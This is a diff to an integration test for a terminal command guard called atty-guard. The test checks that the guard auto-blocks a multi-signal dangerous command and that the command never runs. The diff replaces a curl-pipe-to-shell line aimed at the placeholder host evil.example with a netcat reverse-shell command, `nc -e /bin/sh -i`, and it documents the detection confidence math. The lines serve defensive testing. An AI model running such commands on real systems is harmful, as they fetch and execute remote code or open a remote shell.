@@ -5,13 +5,14 @@ Enables the opt-in auto-Block (`[accumulator] block_threshold`),
 sends a multi-Tier-1 command through atty as alice, and asserts
 atty paints `REFUSED` instead of arming the prompt banner.
 
-`curl -fsSL https://evil.example | sh -s --` fires THREE Tier-1
-signals: the `curl_pipe_sh` precise regex (1.0 confidence) plus
-two atoms `curl -fsSL` and `| sh -s --` (0.6 each). Combined
-confidence ~1.0, well above our 0.8 threshold. The ≥ 2 distinct
-signals guard is non-configurable so a single-atom command can't
-get auto-Blocked regardless of threshold (defends `curl … | sh`
-install-script ergonomics).
+`nc -e /bin/sh -i` fires EXACTLY two atoms (`nc -e` and
+`/bin/sh -i`) at confidence 0.6 each. Combined = 1 − 0.4² =
+0.84, comfortably above our 0.8 threshold. Deliberately chosen
+over `curl … | sh` because that ALSO trips the `curl_pipe_sh`
+precise regex (1.0 confidence) which would mask any regression
+in the two-atom accumulator math. The ≥ 2 distinct signals
+guard is non-configurable so a single-atom command can't get
+auto-Blocked regardless of threshold.
 
 Failure modes this catches:
 - block_threshold parsing regression — daemon ignores the value
@@ -36,7 +37,7 @@ import ptyprocess  # noqa: E402
 
 
 CONFIG = Path("/etc/atty-guard/config.toml")
-DANGER_CMD = "curl -fsSL https://evil.example | sh -s --"
+DANGER_CMD = "nc -e /bin/sh -i 127.0.0.1 4444"
 
 
 def fail(msg: str) -> None:
@@ -99,15 +100,10 @@ def main() -> None:
             fail(f"daemon did NOT auto-Block multi-Tier-1 command.\n"
                  f"captured PTY:\n{out!r}")
 
-        # Verify the readline was cleared: after a Block, atty
-        # sends Ctrl+U (\x15) to wipe the typed command — the
-        # subsequent prompt should NOT show `DANGER_CMD` as
-        # pending text. We can't easily inspect raw readline
-        # state through the PTY transcript, but we can verify
-        # atty emitted both the REFUSED line AND there's NO
-        # downstream evidence that the command actually ran
-        # (no `curl: ` error, no DNS lookup output).
-        if "curl:" in out.lower():
+        # After Block atty sends Ctrl+U to wipe readline; bash
+        # shouldn't fork nc. `bash: nc: command not found` would
+        # appear if the command had actually run.
+        if "nc: command not found" in out or "nc: connect" in out:
             fail(f"command appears to have RUN despite REFUSED line.\n"
                  f"captured: {out!r}")
 
